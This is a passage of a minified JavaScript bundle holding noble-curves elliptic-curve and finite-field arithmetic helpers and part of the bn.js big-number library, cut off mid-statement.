function t(t,e,r,i){Object.defineProperty(t,e,{get:r,set:i,enumerable:!0,configurable:!0})}function e(t){return t&&t.__esModule?t.default:t}var r,i,n,o,s,a=globalThis,u={},l={},c=a.parcelRequire94c2;null==c&&((c=function(t){if(t in u)return u[t].exports;if(t in l){var e=l[t];delete l[t];var r={id:t,exports:{}};return u[t]=r,e.call(r.exports,r,r.exports),r.exports}var i=Error("Cannot find module '"+t+"'");throw i.code="MODULE_NOT_FOUND",i}).register=function(t,e){l[t]=e},a.parcelRequire94c2=c);var h=c.register;h("lkFCe",function(t,e){Object.defineProperty(e,"__esModule",{value:!0}),e.wNAF=function(t,e){return{constTimeNegate:s,hasPrecomputes:t=>1!==p(t),unsafeLadder(e,r,i=t.ZERO){let s=e;for(;r>n;)r&o&&(i=i.add(s)),s=s.double(),r>>=o;return i},precomputeWindow(t,r){let{windows:i,windowSize:n}=u(r,e),o=[],s=t,a=s;for(let t=0;t<i;t++){a=s,o.push(a);for(let t=1;t<n;t++)a=a.add(s),o.push(a);s=a.double()}return o},wNAF(r,i,n){let{windows:a,windowSize:l}=u(r,e),c=t.ZERO,h=t.BASE,f=BigInt(2**r-1),d=2**r,p=BigInt(r);for(let t=0;t<a;t++){let e=t*l,r=Number(n&f);n>>=p,r>l&&(r-=d,n+=o);let a=e+Math.abs(r)-1,u=t%2!=0,g=r<0;0===r?h=h.add(s(u,i[e])):c=c.add(s(g,i[a]))}return{p:c,f:h}},wNAFUnsafe(r,i,s,a=t.ZERO){let{windows:l,windowSize:c}=u(r,e),h=BigInt(2**r-1),f=2**r,d=BigInt(r);for(let t=0;t<l;t++){let e=t*c;if(s===n)break;let r=Number(s&h);if(s>>=d,r>c&&(r-=f,s+=o),0===r)continue;let u=i[e+Math.abs(r)-1];r<0&&(u=u.negate()),a=a.add(u)}return a},getPrecomputes(t,e,r){let i=f.get(e);return i||(i=this.precomputeWindow(e,t),1!==t&&f.set(e,r(i))),i},wNAFCached(t,e,r){let i=p(t);return this.wNAF(i,this.getPrecomputes(i,t,r),e)},wNAFCachedUnsafe(t,e,r,i){let n=p(t);return 1===n?this.unsafeLadder(t,e,i):this.wNAFUnsafe(n,this.getPrecomputes(n,t,r),e,i)},setWindowSize(t,r){a(r,e),d.set(t,r),f.delete(t)}}},e.pippenger=function(t,e,r,n){if(l(r,t),h(n,e),r.length!==n.length)throw Error("arrays of points and scalars must have equal length");let o=t.ZERO,s=(0,i.bitLen)(BigInt(r.length)),a=s>12?s-3:s>4?s-2:s?2:1,u=(1<<a)-1,c=Array(u+1).fill(o),f=Math.floor((e.BITS-1)/a)*a,d=o;for(let t=f;t>=0;t-=a){c.fill(o);for(let e=0;e<n.length;e++){let i=Number(n[e]>>BigInt(t)&BigInt(u));c[i]=c[i].add(r[e])}let e=o;for(let t=c.length-1,r=o;t>0;t--)r=r.add(c[t]),e=e.add(r);if(d=d.add(e),0!==t)for(let t=0;t<a;t++)d=d.double()}return d},e.precomputeMSMUnsafe=function(t,e,r,i){a(i,e.BITS),l(r,t);let n=t.ZERO,o=2**i-1,s=Math.ceil(e.BITS/i),u=BigInt((1<<i)-1),c=r.map(t=>{let e=[];for(let r=0,i=t;r<o;r++)e.push(i),i=i.add(t);return e});return t=>{if(h(t,e),t.length>r.length)throw Error("array of scalars must be smaller than array of points");let o=n;for(let e=0;e<s;e++){if(o!==n)for(let t=0;t<i;t++)o=o.double();let r=BigInt(s*i-(e+1)*i);for(let e=0;e<t.length;e++){let i=Number(t[e]>>r&u);i&&(o=o.add(c[e][i-1]))}}return o}},e.validateBasic=function(t){return(0,r.validateField)(t.Fp),(0,i.validateObject)(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...(0,r.nLength)(t.n,t.nBitLength),...t,p:t.Fp.ORDER})};var r=c("2D9sF"),i=c("esaJO");let n=BigInt(0),o=BigInt(1);function s(t,e){let r=e.negate();return t?r:e}function a(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw Error("invalid window size, expected [1.."+e+"], got W="+t)}function u(t,e){return a(t,e),{windows:Math.ceil(e/t)+1,windowSize:2**(t-1)}}function l(t,e){if(!Array.isArray(t))throw Error("array expected");t.forEach((t,r)=>{if(!(t instanceof e))throw Error("invalid point at index "+r)})}function h(t,e){if(!Array.isArray(t))throw Error("array of scalars expected");t.forEach((t,r)=>{if(!e.isValid(t))throw Error("invalid scalar at index "+r)})}let f=new WeakMap,d=new WeakMap;function p(t){return d.get(t)||1}}),h("2D9sF",function(t,e){Object.defineProperty(t.exports,"__esModule",{value:!0}),t.exports.isNegativeLE=void 0,t.exports.mod=h,t.exports.pow=f,t.exports.pow2=function(t,e,r){let n=t;for(;e-- >i;)n*=n,n%=r;return n},t.exports.invert=d,t.exports.tonelliShanks=p,t.exports.FpSqrt=g,t.exports.validateField=function(t){let e=m.reduce((t,e)=>(t[e]="function",t),{ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"});return(0,r.validateObject)(t,e)},t.exports.FpPow=y,t.exports.FpInvertBatch=b,t.exports.FpDiv=function(t,e,r){return t.mul(e,"bigint"==typeof r?d(r,t.ORDER):t.inv(r))},t.exports.FpLegendre=w,t.exports.FpIsSquare=function(t){let e=w(t.ORDER);return r=>{let i=e(t,r);return t.eql(i,t.ZERO)||t.eql(i,t.ONE)}},t.exports.nLength=v,t.exports.Field=function(t,e,o=!1,s={}){let a;if(t<=i)throw Error("invalid field: expected ORDER > 0, got "+t);let{nBitLength:u,nByteLength:l}=v(t,e);if(l>2048)throw Error("invalid field: expected ORDER of <= 2048 bytes");let c=Object.freeze({ORDER:t,BITS:u,BYTES:l,MASK:(0,r.bitMask)(u),ZERO:i,ONE:n,create:e=>h(e,t),isValid:e=>{if("bigint"!=typeof e)throw Error("invalid field element: expected bigint, got "+typeof e);return i<=e&&e<t},is0:t=>t===i,isOdd:t=>(t&n)===n,neg:e=>h(-e,t),eql:(t,e)=>t===e,sqr:e=>h(e*e,t),add:(e,r)=>h(e+r,t),sub:(e,r)=>h(e-r,t),mul:(e,r)=>h(e*r,t),pow:(t,e)=>y(c,t,e),div:(e,r)=>h(e*d(r,t),t),sqrN:t=>t*t,addN:(t,e)=>t+e,subN:(t,e)=>t-e,mulN:(t,e)=>t*e,inv:e=>d(e,t),sqrt:s.sqrt||(e=>(a||(a=g(t)),a(c,e))),invertBatch:t=>b(c,t),cmov:(t,e,r)=>r?e:t,toBytes:t=>o?(0,r.numberToBytesLE)(t,l):(0,r.numberToBytesBE)(t,l),fromBytes:t=>{if(t.length!==l)throw Error("Field.fromBytes: expected "+l+" bytes, got "+t.length);return o?(0,r.bytesToNumberLE)(t):(0,r.bytesToNumberBE)(t)}});return Object.freeze(c)},t.exports.FpSqrtOdd=function(t,e){if(!t.isOdd)throw Error("Field doesn't have isOdd");let r=t.sqrt(e);return t.isOdd(r)?r:t.neg(r)},t.exports.FpSqrtEven=function(t,e){if(!t.isOdd)throw Error("Field doesn't have isOdd");let r=t.sqrt(e);return t.isOdd(r)?t.neg(r):r},t.exports.hashToPrivateScalar=function(t,e,i=!1){let o=(t=(0,r.ensureBytes)("privateHash",t)).length,s=v(e).nByteLength+8;if(s<24||o<s||o>1024)throw Error("hashToPrivateScalar: expected "+s+"-1024 bytes of input, got "+o);return h(i?(0,r.bytesToNumberLE)(t):(0,r.bytesToNumberBE)(t),e-n)+n},t.exports.getFieldBytesLength=x,t.exports.getMinHashLength=k,t.exports.mapHashToField=function(t,e,i=!1){let o=t.length,s=x(e),a=k(e);if(o<16||o<a||o>1024)throw Error("expected "+a+"-1024 bytes of input, got "+o);let u=h(i?(0,r.bytesToNumberBE)(t):(0,r.bytesToNumberLE)(t),e-n)+n;return i?(0,r.numberToBytesLE)(u,s):(0,r.numberToBytesBE)(u,s)};var r=c("esaJO");let i=BigInt(0),n=BigInt(1),o=BigInt(2),s=BigInt(3),a=BigInt(4),u=BigInt(5),l=BigInt(8);function h(t,e){let r=t%e;return r>=i?r:e+r}function f(t,e,r){if(e<i)throw Error("invalid exponent, negatives unsupported");if(r<=i)throw Error("invalid modulus");if(r===n)return i;let o=n;for(;e>i;)e&n&&(o=o*t%r),t=t*t%r,e>>=n;return o}function d(t,e){if(t===i)throw Error("invert: expected non-zero number");if(e<=i)throw Error("invert: expected positive modulus, got "+e);let r=h(t,e),o=e,s=i,a=n,u=n,l=i;for(;r!==i;){let t=o/r,e=o%r,i=s-u*t,n=a-l*t;o=r,r=e,s=u,a=l,u=i,l=n}if(o!==n)throw Error("invert: does not exist");return h(s,e)}function p(t){let e,r,s;let u=(t-n)/o;for(e=t-n,r=0;e%o===i;e/=o,r++);for(s=o;s<t&&f(s,u,t)!==t-n;s++)if(s>1e3)throw Error("Cannot find square root: likely non-prime P");if(1===r){let e=(t+n)/a;return function(t,r){let i=t.pow(r,e);if(!t.eql(t.sqr(i),r))throw Error("Cannot find square root");return i}}let l=(e+n)/o;return function(t,i){if(t.pow(i,u)===t.neg(t.ONE))throw Error("Cannot find square root");let o=r,a=t.pow(t.mul(t.ONE,s),e),c=t.pow(i,l),h=t.pow(i,e);for(;!t.eql(h,t.ONE);){if(t.eql(h,t.ZERO))return t.ZERO;let e=1;for(let r=t.sqr(h);e<o&&!t.eql(r,t.ONE);e++)r=t.sqr(r);let r=t.pow(a,n<<BigInt(o-e-1));a=t.sqr(r),c=t.mul(c,r),h=t.mul(h,a),o=e}return c}}function g(t){if(t%a===s){let e=(t+n)/a;return function(t,r){let i=t.pow(r,e);if(!t.eql(t.sqr(i),r))throw Error("Cannot find square root");return i}}if(t%l===u){let e=(t-u)/l;return function(t,r){let i=t.mul(r,o),n=t.pow(i,e),s=t.mul(r,n),a=t.mul(t.mul(s,o),n),u=t.mul(s,t.sub(a,t.ONE));if(!t.eql(t.sqr(u),r))throw Error("Cannot find square root");return u}}return p(t)}t.exports.isNegativeLE=(t,e)=>(h(t,e)&n)===n;let m=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function y(t,e,r){if(r<i)throw Error("invalid exponent, negatives unsupported");if(r===i)return t.ONE;if(r===n)return e;let o=t.ONE,s=e;for(;r>i;)r&n&&(o=t.mul(o,s)),s=t.sqr(s),r>>=n;return o}function b(t,e){let r=Array(e.length),i=e.reduce((e,i,n)=>t.is0(i)?e:(r[n]=e,t.mul(e,i)),t.ONE),n=t.inv(i);return e.reduceRight((e,i,n)=>t.is0(i)?e:(r[n]=t.mul(e,r[n]),t.mul(e,i)),n),r}function w(t){let e=(t-n)/o;return(t,r)=>t.pow(r,e)}function v(t,e){let r=void 0!==e?e:t.toString(2).length,i=Math.ceil(r/8);return{nBitLength:r,nByteLength:i}}function x(t){if("bigint"!=typeof t)throw Error("field order must be bigint");return Math.ceil(t.toString(2).length/8)}function k(t){let e=x(t);return e+Math.ceil(e/2)}}),h("esaJO",function(t,e){Object.defineProperty(t.exports,"__esModule",{value:!0}),t.exports.notImplemented=t.exports.bitMask=void 0,t.exports.isBytes=o,t.exports.abytes=s,t.exports.abool=function(t,e){if("boolean"!=typeof e)throw Error(t+" boolean expected, got "+e)},t.exports.bytesToHex=u,t.exports.numberToHexUnpadded=l,t.exports.hexToNumber=c,t.exports.hexToBytes=d,t.exports.bytesToNumberBE=function(t){return c(u(t))},t.exports.bytesToNumberLE=function(t){return s(t),c(u(Uint8Array.from(t).reverse()))},t.exports.numberToBytesBE=p,t.exports.numberToBytesLE=function(t,e){return p(t,e).reverse()},t.exports.numberToVarBytesBE=function(t){return d(l(t))},t.exports.ensureBytes=function(t,e,r){let i;if("string"==typeof e)try{i=d(e)}catch(e){throw Error(t+" must be hex string or Uint8Array, cause: "+e)}else if(o(e))i=Uint8Array.from(e);else throw Error(t+" must be hex string or Uint8Array");let n=i.length;if("number"==typeof r&&n!==r)throw Error(t+" of length "+r+" expected, got "+n);return i},t.exports.concatBytes=g,t.exports.equalBytes=function(t,e){if(t.length!==e.length)return!1;let r=0;for(let i=0;i<t.length;i++)r|=t[i]^e[i];return 0===r},t.exports.utf8ToBytes=function(t){if("string"!=typeof t)throw Error("string expected");return new Uint8Array(new TextEncoder().encode(t))},t.exports.inRange=y,t.exports.aInRange=function(t,e,r,i){if(!y(e,r,i))throw Error("expected valid "+t+": "+r+" <= n < "+i+", got "+e)},t.exports.bitLen=function(t){let e;for(e=0;t>r;t>>=i,e+=1);return e},t.exports.bitGet=function(t,e){return t>>BigInt(e)&i},t.exports.bitSet=function(t,e,n){return t|(n?i:r)<<BigInt(e)},t.exports.createHmacDrbg=function(t,e,r){if("number"!=typeof t||t<2)throw Error("hashLen must be a number");if("number"!=typeof e||e<2)throw Error("qByteLen must be a number");if("function"!=typeof r)throw Error("hmacFn must be a function");let i=b(t),n=b(t),o=0,s=()=>{i.fill(1),n.fill(0),o=0},a=(...t)=>r(n,i,...t),u=(t=b())=>{n=a(w([0]),t),i=a(),0!==t.length&&(n=a(w([1]),t),i=a())},l=()=>{if(o++>=1e3)throw Error("drbg: tried 1000 values");let t=0,r=[];for(;t<e;){let e=(i=a()).slice();r.push(e),t+=i.length}return g(...r)};return(t,e)=>{let r;for(s(),u(t);!(r=e(l()));)u();return s(),r}},t.exports.validateObject=function(t,e,r={}){let i=(e,r,i)=>{let n=v[r];if("function"!=typeof n)throw Error("invalid validator function");let o=t[e];if((!i||void 0!==o)&&!n(o,t))throw Error("param "+String(e)+" is invalid. Expected "+r+", got "+o)};for(let[t,r]of Object.entries(e))i(t,r,!1);for(let[t,e]of Object.entries(r))i(t,e,!0);return t},t.exports.memoized=function(t){let e=new WeakMap;return(r,...i)=>{let n=e.get(r);if(void 0!==n)return n;let o=t(r,...i);return e.set(r,o),o}};/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */let r=BigInt(0),i=BigInt(1),n=BigInt(2);function o(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&"Uint8Array"===t.constructor.name}function s(t){if(!o(t))throw Error("Uint8Array expected")}let a=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function u(t){s(t);let e="";for(let r=0;r<t.length;r++)e+=a[t[r]];return e}function l(t){let e=t.toString(16);return 1&e.length?"0"+e:e}function c(t){if("string"!=typeof t)throw Error("hex string expected, got "+typeof t);return""===t?r:BigInt("0x"+t)}let h={_0:48,_9:57,A:65,F:70,a:97,f:102};function f(t){return t>=h._0&&t<=h._9?t-h._0:t>=h.A&&t<=h.F?t-(h.A-10):t>=h.a&&t<=h.f?t-(h.a-10):void 0}function d(t){if("string"!=typeof t)throw Error("hex string expected, got "+typeof t);let e=t.length,r=e/2;if(e%2)throw Error("hex string expected, got unpadded hex of length "+e);let i=new Uint8Array(r);for(let e=0,n=0;e<r;e++,n+=2){let r=f(t.charCodeAt(n)),o=f(t.charCodeAt(n+1));if(void 0===r||void 0===o)throw Error('hex string expected, got non-hex character "'+(t[n]+t[n+1])+'" at index '+n);i[e]=16*r+o}return i}function p(t,e){return d(t.toString(16).padStart(2*e,"0"))}function g(...t){let e=0;for(let r=0;r<t.length;r++){let i=t[r];s(i),e+=i.length}let r=new Uint8Array(e);for(let e=0,i=0;e<t.length;e++){let n=t[e];r.set(n,i),i+=n.length}return r}let m=t=>"bigint"==typeof t&&r<=t;function y(t,e,r){return m(t)&&m(e)&&m(r)&&e<=t&&t<r}t.exports.bitMask=t=>(n<<BigInt(t-1))-i;let b=t=>new Uint8Array(t),w=t=>Uint8Array.from(t),v={bigint:t=>"bigint"==typeof t,function:t=>"function"==typeof t,boolean:t=>"boolean"==typeof t,string:t=>"string"==typeof t,stringOrUint8Array:t=>"string"==typeof t||o(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>"function"==typeof t&&Number.isSafeInteger(t.outputLen)};t.exports.notImplemented=()=>{throw Error("not implemented")}}),h("dEXSZ",function(t,e){!function(t,e){function r(t,e){if(!t)throw Error(e||"Assertion failed")}function i(t,e){t.super_=e;var r=function(){};r.prototype=e.prototype,t.prototype=new r,t.prototype.constructor=t}function n(t,e,r){if(n.isBN(t))return t;this.negative=0,this.words=null,this.length=0,this.red=null,null!==t&&(("le"===e||"be"===e)&&(r=e,e=10),this._init(t||0,e||10,r||"be"))}"object"==typeof t?t.exports=n:e.BN=n,n.BN=n,n.wordSize=26;try{h="undefined"!=typeof window&&void 0!==window.Buffer?window.Buffer:c("kjyEk").Buffer}catch(t){}function o(t,e){var i=t.charCodeAt(e);return i>=48&&i<=57?i-48:i>=65&&i<=70?i-55:i>=97&&i<=102?i-87:void r(!1,"Invalid character in "+t)}function s(t,e,r){var i=o(t,r);return r-1>=e&&(i|=o(t,r-1)<<4),i}function a(t,e,i,n){for(var o=0,s=0,a=Math.min(t.length,i),u=e;u<a;u++){var l=t.charCodeAt(u)-48;o*=n,s=l>=49?l-49+10:l>=17?l-17+10:l,r(l>=0&&s<n,"Invalid character"),o+=s}return o}function u(t,e){t.words=e.words,t.length=e.length,t.negative=e.negative,t.red=e.red}if(n.isBN=function(t){return t instanceof n||null!==t&&"object"==typeof t&&t.constructor.wordSize===n.wordSize&&Array.isArray(t.words)},n.max=function(t,e){return t.cmp(e)>0?t:e},n.min=function(t,e){return 0>t.cmp(e)?t:e},n.prototype._init=function(t,e,i){if("number"==typeof t)return this._initNumber(t,e,i);if("object"==typeof t)return this._initArray(t,e,i);"hex"===e&&(e=16),r(e===(0|e)&&e>=2&&e<=36);var n=0;"-"===(t=t.toString().replace(/\s+/g,""))[0]&&(n++,this.negative=1),n<t.length&&(16===e?this._parseHex(t,n,i):(this._parseBase(t,e,n),"le"===i&&this._initArray(this.toArray(),e,i)))},n.prototype._initNumber=function(t,e,i){t<0&&(this.negative=1,t=-t),t<0x4000000?(this.words=[0x3ffffff&t],this.length=1):t<0x10000000000000?(this.words=[0x3ffffff&t,t/0x4000000&0x3ffffff],this.length=2):(r(t<0x20000000000000),this.words=[0x3ffffff&t,t/0x4000000&0x3ffffff,1],this.length=3),"le"===i&&this._initArray(this.toArray(),e,i)},n.prototype._initArray=function(t,e,i){if(r("number"==typeof t.length),t.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(t.length/3),this.words=Array(this.length);for(var n,o,s=0;s<this.length;s++)this.words[s]=0;var a=0;if("be"===i)for(s=t.length-1,n=0;s>=0;s-=3)o=t[s]|t[s-1]<<8|t[s-2]<<16,this.words[n]|=o<<a&0x3ffffff,this.words[n+1]=o>>>26-a&0x3ffffff,(a+=24)>=26&&(a-=26,n++);else if("le"===i)for(s=0,n=0;s<t.length;s+=3)o=t[s]|t[s+1]<<8|t[s+2]<<16,this.words[n]|=o<<a&0x3ffffff,this.words[n+1]=o>>>26-a&0x3ffffff,(a+=24)>=26&&(a-=26,n++);return this._strip()},n.prototype._parseHex=function(t,e,r){this.length=Math.ceil((t.length-e)/6),this.words=Array(this.length);for(var i,n=0;n<this.length;n++)this.words[n]=0;var o=0,a=0;if("be"===r)for(n=t.length-1;n>=e;n-=2)i=s(t,e,n)<<o,this.words[a]|=0x3ffffff&i,o>=18?(o-=18,a+=1,this.words[a]|=i>>>26):o+=8;else for(n=(t.length-e)%2==0?e+1:e;n<t.length;n+=2)i=s(t,e,n)<<o,this.words[a]|=0x3ffffff&i,o>=18?(o-=18,a+=1,this.words[a]|=i>>>26):o+=8;this._strip()},n.prototype._parseBase=function(t,e,r){this.words=[0],this.length=1;for(var i=0,n=1;n<=0x3ffffff;n*=e)i++;i--,n=n/e|0;for(var o=t.length-r,s=o%i,u=Math.min(o,o-s)+r,l=0,c=r;c<u;c+=i)l=a(t,c,c+i,e),this.imuln(n),this.words[0]+l<0x4000000?this.words[0]+=l:this._iaddn(l);if(0!==s){var h=1;for(l=a(t,c,t.length,e),c=0;c<s;c++)h*=e;this.imuln(h),this.words[0]+l<0x4000000?this.words[0]+=l:this._iaddn(l)}this._strip()},n.prototype.copy=function(t){t.words=Array(this.length);for(var e=0;e<this.length;e++)t.words[e]=this.words[e];t.length=this.length,t.negative=this.negative,t.red=this.red},n.prototype._move=function(t){u(t,this)},n.prototype.clone=function(){var t=new n(null);return this.copy(t),t},n.prototype._expand=function(t){for(;this.length<t;)this.words[this.length++]=0;return this},n.prototype._strip=function(){for(;this.length>1&&0===this.words[this.length-1];)this.length--;return this._normSign()},n.prototype._normSign=function(){return 1===this.length&&0===this.words[0]&&(this.negative=0),this},"undefined"!=typeof Symbol&&"function"==typeof Symbol.for)try{n.prototype[Symbol.for("nodejs.util.inspect.custom")]=l}catch(t){n.prototype.inspect=l}else n.prototype.inspect=l;function l(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"}var h,f=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],d=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],p=[0,0,0x2000000,0x290d741,0x1000000,0x2e90edd,0x39aa400,0x267bf47,0x1000000,0x290d741,1e7,0x12959c3,0x222c000,0x3bd7765,7529536,0xadcea1,0x1000000,0x1704f61,0x206fc40,0x2cddcf9,64e6,4084101,5153632,6436343,7962624,9765625,0xb54ba0,0xdaf26b,0x1069c00,0x138f9ad,243e5,0x1b4d89f,0x2000000,0x25528a1,0x2b54a20,0x3216b93,0x39aa400];function g(t,e,r){r.negative=e.negative^t.negative;var i=t.length+e.length|0;r.length=i,i=i-1|0;var n=0|t.words[0],o=0|e.words[0],s=n*o,a=0x3ffffff&s,u=s/0x4000000|0;r.words[0]=a;for(var l=1;l<i;l++){for(var c=u>>>26,h=0x3ffffff&u,f=Math.min(l,e.length-1),d=Math.max(0,l-t.length+1);d<=f;d++){var p=l-d|0;c+=(s=(n=0|t.words[p])*(o=0|e.words[d])+h)/0x4000000|0,h=0x3ffffff&s}r.words[l]=0|h,u=0|c}return 0!==u?r.words[l]=0|u:r.length--,r._strip()}n.prototype.toString=function(t,e){if(e=0|e||1,16===(t=t||10)||"hex"===t){i="";for(var i,n=0,o=0,s=0;s<this.length;s++){var a=this.words[s],u=((a<<n|o)&0xffffff).toString(16);o=a>>>24-n&0xffffff,(n+=2)>=26&&(n-=26,s--),i=0!==o||s!==this.length-1?f[6-u.length]+u+i:u+i}for(0!==o&&(i=o.toString(16)+i);i.length%e!=0;)i="0"+i;return 0!==this.negative&&(i="-"+i),i}if(t===(0|t)&&t>=2&&t<=36){var l=d[t],c=p[t];i="";var h=this.clone();for(h.negative=0;!h.isZero();){var g=h.modrn(c).toString(t);i=(h=h.idivn(c)).isZero()?g+i:f[l-g.length]+g+i}for(this.isZero()&&(i="0"+i);i.length%e!=0;)i="0"+i;return 0!==this.negative&&(i="-"+i),i}r(!1,"Base should be between 2 and 36")},n.prototype.toNumber=function(){var t=this.words[0];return 2===this.length?t+=0x4000000*this.words[1]:3===this.length&&1===this.words[2]?t+=0x10000000000000+0x4000000*this.words[1]:this.length>2&&r(!1,"Number can only safely store up to 53 bits"),0!==this.negative?-t:t},n.prototype.toJSON=function(){return this.toString(16,2)},h&&(n.prototype.toBuffer=function(t,e){return this.toArrayLike(h,t,e)}),n.prototype.toArray=function(t,e){return this.toArrayLike(Array,t,e)},n.prototype.toArrayLike=function(t,e,i){this._strip();var n=this.byteLength(),o=i||Math.max(1,n);r(n<=o,"byte array longer than desired length"),r(o>0,"Requested array length <= 0");var s=t.allocUnsafe?t.allocUnsafe(o):new t(o);return this["_toArrayLike"+("le"===e?"LE":"BE")](s,n),s},n.prototype._toArrayLikeLE=function(t,e){for(var r=0,i=0,n=0,o=0;n<this.length;n++){var s=this.words[n]<<o|i;t[r++]=255&s,r<t.length&&(t[r++]=s>>8&255),r<t.length&&(t[r++]=s>>16&255),6===o?(r<t.length&&(t[r++]=s>>24&255),i=0,o=0):(i=s>>>24,o+=2)}if(r<t.length)for(t[r++]=i;r<t.length;)t[r++]=0},n.prototype._toArrayLikeBE=function(t,e){for(var r=t.length-1,i=0,n=0,o=0;n<this.length;n++){var s=this.words[n]<<o|i;t[r--]=255&s,r>=0&&(t[r--]=s>>8&255),r>=0&&(t[r--]=s>>16&255),6===o?(r>=0&&(t[r--]=s>>24&255),i=0,o=0):(i=s>>>24,o+=2)}if(r>=0)for(t[r--]=i;r>=0;)t[r--]=0},Math.clz32?n.prototype._countBits=function(t){return 32-Math.clz32(t)}:n.prototype._countBits=function(t){var e=t,r=0;return e>=4096&&(r+=13,e>>>=13),e>=64&&(r+=7,e>>>=7),e>=8&&(r+=4,e>>>=4),e>=2&&(r+=2,e>>>=2),r+e},n.prototype._zeroBits=function(t){if(0===t)return 26;var e=t,r=0;return(8191&e)==0&&(r+=13,e>>>=13),(127&e)==0&&(r+=7,e>>>=7),(15&e)==0&&(r+=4,e>>>=4),(3&e)==0&&(r+=2,e>>>=2),(1&e)==0&&r++,r},n.prototype.bitLength=function(){var t=this.words[this.length-1],e=this._countBits(t);return(this.length-1)*26+e},n.prototype.zeroBits=function(){if(this.isZero())return 0;for(var t=0,e=0;e<this.length;e++){var r=this._zeroBits(this.words[e]);if(t+=r,26!==r)break}return t},n.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},n.prototype.toTwos=function(t){return 0!==this.negative?this.abs().inotn(t).iaddn(1):this.clone()},n.prototype.fromTwos=function(t){return this.testn(t-1)?this.notn(t).iaddn(1).ineg():this.clone()},n.prototype.isNeg=function(){return 0!==this.negative},n.prototype.neg=function(){return this.clone().ineg()},n.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},n.prototype.iuor=function(t){for(;this.length<t.length;)this.words[this.length++]=0;for(var e=0;e<t.length;e++)this.words[e]=this.words[e]|t.words[e];return this._strip()},n.prototype.ior=function(t){return r((this.negative|t.negative)==0),this.iuor(t)},n.prototype.or=function(t){return this.length>t.length?this.clone().ior(t):t.clone().ior(this)},n.prototype.uor=function(t){return this.length>t.length?this.clone().iuor(t):t.clone().iuor(this)},n.prototype.iuand=function(t){var e;e=this.length>t.length?t:this;for(var r=0;r<e.length;r++)this.words[r]=this.words[r]&t.words[r];return this.length=e.length,this._strip()},n.prototype.iand=function(t){return r((this.negative|t.negative)==0),this.iuand(t)},n.prototype.and=function(t){return this.length>t.length?this.clone().iand(t):t.clone().iand(this)},n.prototype.uand=function(t){return this.length>t.length?this.clone().iuand(t):t.clone().iuand(this)},n.prototype.iuxor=function(t){this.length>t.length?(e=this,r=t):(e=t,r=this);for(var e,r,i=0;i<r.length;i++)this.words[i]=e.words[i]^r.words[i];if(this!==e)for(;i<e.length;i++)this.words[i]=e.words[i];return this.length=e.length,this._strip()},n.prototype.ixor=function(t){return r((this.negative|t.negative)==0),this.iuxor(t)},n.prototype.xor=function(t){return this.length>t.length?this.clone().ixor(t):t.clone().ixor(this)},n.prototype.uxor=function(t){return this.length>t.length?this.clone().iuxor(t):t.clone().iuxor(this)},n.prototype.inotn=function(t){r("number"==typeof t&&t>=0);var e=0|Math.ceil(t/26),i=t%26;this._expand(e),i>0&&e--;for(var n=0;n<e;n++)this.words[n]=0x3ffffff&~this.words[n];return i>0&&(this.words[n]=~this.words[n]&0x3ffffff>>26-i),this._strip()},n.prototype.notn=function(t){return this.clone().inotn(t)},n.prototype.setn=function(t,e){r("number"==typeof t&&t>=0);var i=t/26|0,n=t%26;return this._expand(i+1),e?this.words[i]=this.words[i]|1<<n:this.words[i]=this.words[i]&~(1<<n),this._strip()},n.prototype.iadd=function(t){if(0!==this.negative&&0===t.negative)return this.negative=0,e=this.isub(t),this.negative^=1,this._normSign();if(0===this.negative&&0!==t.negative)return t.negative=0,e=this.isub(t),t.negative=1,e._normSign();this.length>t.length?(r=this,i=t):(r=t,i=this);for(var e,r,i,n=0,o=0;o<i.length;o++)e=(0|r.words[o])+(0|i.words[o])+n,this.words[o]=0x3ffffff&e,n=e>>>26;for(;0!==n&&o<r.length;o++)e=(0|r.words[o])+n,this.words[o]=0x3ffffff&e,n=e>>>26;if(this.length=r.length,0!==n)this.words[this.length]=n,this.length++;else if(r!==this)for(;o<r.length;o++)this.words[o]=r.words[o];return this},n.prototype.add=function(t){var e;return 0!==t.negative&&0===this.negative?(t.negative=0,e=this.sub(t),t.negative^=1,e):0===t.negative&&0!==this.negative?(this.negative=0,e=t.sub(this),this.negative=1,e):this.length>t.length?this.clone().iadd(t):t.clone().iadd(this)},n.prototype.isub=function(t){if(0!==t.negative){t.negative=0;var e,r,i=this.iadd(t);return t.negative=1,i._normSign()}if(0!==this.negative)return this.negative=0,this.iadd(t),this.negative=1,this._normSign();var n=this.cmp(t);if(0===n)return this.negative=0,this.length=1,this.words[0]=0,this;n>0?(e=this,r=t):(e=t,r=this);for(var o=0,s=0;s<r.length;s++)o=(i=(0|e.words[s])-(0|r.words[s])+o)>>26,this.words[s]=0x3ffffff&i;for(;0!==o&&s<e.length;s++)o=(i=(0|e.words[s])+o)>>26,this.words[s]=0x3ffffff&i;if(0===o&&s<e.length&&e!==this)for(;s<e.length;s++)this.words[s]=e.words[s];return this.length=Math.max(this.length,s),e!==this&&(this.negative=1),this._strip()},n.prototype.sub=function(t){return this.clone().isub(t)};var m=function(t,e,r){var 